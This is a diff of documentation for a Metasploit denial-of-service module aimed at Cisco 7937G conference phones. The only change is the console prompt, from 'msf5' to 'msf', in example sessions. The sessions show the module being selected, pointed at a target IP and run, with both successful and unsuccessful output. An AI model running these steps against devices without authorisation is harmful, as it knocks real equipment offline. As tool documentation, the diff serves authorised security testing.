@@ -29,10 +29,10 @@
 
 #### Successful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
+msf > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
+msf auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
@@ -54,10 +54,10 @@ msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 #### Unsuccessful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
+msf > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
+msf auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
 [-] 192.168.110.209 - Device doesn't appear to be functioning (already dos'd?) or SSH is not enabled.
@@ -68,10 +68,10 @@ msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 #### Successful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
+msf > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
+msf auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
 [*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
@@ -93,10 +93,10 @@ msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 #### Unsuccessful Scenario:
 ```
-msf5 > use auxiliary/dos/cisco/cisco_7937G_dos 
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
+msf > use auxiliary/dos/cisco/cisco_7937G_dos 
+msf auxiliary(dos/cisco/cisco_7937G_dos) > set rhost 192.168.110.209
 rhost => 192.168.110.209
-msf5 auxiliary(dos/cisco/cisco_7937G_dos) > run
+msf auxiliary(dos/cisco/cisco_7937G_dos) > run
 
 [*] Starting server...
 [-] 192.168.110.209 - Device doesn't appear to be functioning (already dos'd?) or SSH is not enabled.
